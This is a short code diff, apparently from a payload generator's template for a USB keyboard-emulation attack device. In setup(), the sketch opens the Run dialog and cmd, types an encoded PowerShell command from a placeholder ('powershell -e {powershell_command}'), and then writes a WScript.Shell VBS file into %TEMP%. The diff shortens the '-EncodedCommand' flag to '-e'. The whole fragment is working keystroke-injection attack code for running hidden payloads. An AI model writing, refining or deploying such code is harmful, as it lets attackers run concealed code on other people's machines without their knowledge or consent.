@@ -174,7 +174,7 @@ void setup()
   // run through cmd
   CommandAtRunBar("cmd");
   delay(1000);
-  Keyboard.println("powershell -EncodedCommand {powershell_command}");
+  Keyboard.println("powershell -e {powershell_command}");
   // Tweak this delay.  Larger files take longer to decode through powershell.
   delay(10000);
   Keyboard.println("echo Set WshShell = CreateObject(\\"WScript.Shell\\") > %TEMP%\\\\{vbs}");
